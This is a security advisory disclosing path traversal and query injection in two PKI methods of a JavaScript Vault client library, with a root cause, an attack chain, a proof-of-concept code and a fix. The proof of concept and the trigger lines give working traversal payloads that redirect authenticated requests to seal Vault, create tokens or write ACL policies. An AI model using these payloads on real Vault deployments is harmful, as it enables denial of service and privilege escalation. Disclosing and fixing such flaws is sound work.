# Security Advisory - GHSA-9gmj-q25w-vq6x

- Title: Path Traversal and Query Injection in two PKI methods due to incomplete fix
- CVE ID: TBD
- CVSS Score: TBD
- Reported Date: 2026-08-12
- Published Date: 2026-08-17
- Last Updated: 2026-08-17

## Summary

Two public methods interpolate a caller-supplied identifier directly into the axios request URL without `encodeURIComponent`, allowing HTTP path traversal (`../`) and query-parameter injection into the Vault API. This is the same vulnerability class fixed in CVE-2026-55100, but the fix encoded ~40 sibling methods and missed these two PKI methods. Notably the fix DID encode the siblings `pkiReadRole`/`pkiDeleteRole` (same `roles` prefix) and `pkiReadCert` — the *create*/*issue* PKI identifier sites were overlooked.

## Affected Component

- **File:** `src/Vault.js`
- **Functions:**
  - `genPkiCertificate` (line 2542): `url:
`${rootPath}/${config.pkiGenerateCertificate[0]}/${params.role}``
(`pki/issue/<role>`, POST)
  - `createPkiRole` (line 2658): `url:
`${rootPath}/${config.pkiCreateRole[0]}/${params.name}``
(`pki/roles/<name>`, POST)
- **Affected versions:** <= 0.5.2
- **Severity:** 9.8 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## Root Cause

The axios instance is created with `baseURL` ending in `/v1`. When a relative `url` contains `../` segments, axios (verified on the shipped axios 1.18.0) resolves it with standard URL normalization, walking the request path out of `pki/issue/` (or `pki/roles/`) onto arbitrary Vault endpoints under `/v1`. Because the identifier is neither validated nor `encodeURIComponent`-encoded, an attacker-influenced role/name value redirects the authenticated POST (bearing `X-Vault-Token`) to an attacker-chosen endpoint, and can inject arbitrary query parameters.

## Attack Chain

1. `vault.genPkiCertificate(appToken, { role: userInput, ... }, mount)` — no validation on `params.role`; interpolated raw at Vault.js:2542.
2. `role = "../../../sys/seal"` → `url: "pki/issue/../../../sys/seal"`.
3. `this.instance(Options)` (axios 1.18.0) normalizes the `../` against the `/v1` baseURL → request goes to `POST /v1/sys/seal`.
4. The authenticated POST (X-Vault-Token) executes against the attacker-chosen endpoint, bounded only by the app token's ACL. Same for `createPkiRole` at :2658 via `params.name`.

## Proof of Concept

Using the library's exact request construction against a capture server with axios 1.18.0 (the resolved lockfile version):

```js
const inst = axios.create({ baseURL: `https://urldefense.com/v3/__http://127.0.0.1:$*7Bport*7D/v1__;JSU!!Dq81_Y1A2Q!1XX1fbr76o5rIkbK_ZyavrEmDUbP5Mim2oMiwI0Ox1ZV-3t_lL4PA-BXfhZhNpTp7GxJ01IqWsi45vadJYk$ ` });
await inst({ url: "pki/issue/../../../sys/seal", method: "post" });
// Server received: POST /sys/seal
await inst({ url: "pki/roles/../../../auth/token/create", method: "post" });
// Server received: POST /auth/token/create
await inst({ url: "pki/issue/web?list=true", method: "post" });
// Server received: POST /v1/pki/issue/web?list=true  (query injected onto the wire)
await inst({ url: "pki/issue/%2e%2e%2f%2e%2e%2fsys/seal", method: "post" });
// Server received literal: POST /v1/pki/issue/%2e%2e%2f%2e%2e%2fsys/seal
// (pre-encoded input stays inside path — proving encodeURIComponent is the missing guard)
```

Library-level trigger:

```js
vault.genPkiCertificate(appToken, { role: "../../../sys/seal", commonName: "x", format: "pem" }, mount);
vault.createPkiRole(appToken, { name: "../../../sys/policies/acl/attacker-policy" }, mount);
```

## Impact

The redirected request executes with the application's Vault token permissions against an attacker-chosen endpoint. Depending on the token ACL: `sys/seal` (DoS → A:H), policy/token write endpoints such as `sys/policies/acl/*` and `auth/token/create` (privilege/policy manipulation → I:H), and response-bearing reads (confidentiality). Query-parameter injection (`?wrap_ttl=...`, `?list=true`) further alters request semantics.

## Suggested Fix

Wrap both identifiers with `encodeURIComponent`, matching the fix already applied to sibling methods in ea2f760:

```js
// src/Vault.js:2542
url: `${rootPath}/${config.pkiGenerateCertificate[0]}/${encodeURIComponent(params.role)}`
// src/Vault.js:2658
url: `${rootPath}/${config.pkiCreateRole[0]}/${encodeURIComponent(params.name)}`
```

## References

- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')](https://cwe.mitre.org/data/definitions/74.html)
- Related: [CVE-2026-55100](https://github.com/advisories/GHSA-g956-2f74-rmv7) / [GHSA-g956-2f74-rmv7](https://github.com/kyndryl-open-source/hashi-vault-js/security/advisories/GHSA-g956-2f74-rmv7) (this is an incomplete fix — the two PKI methods above were not encoded)
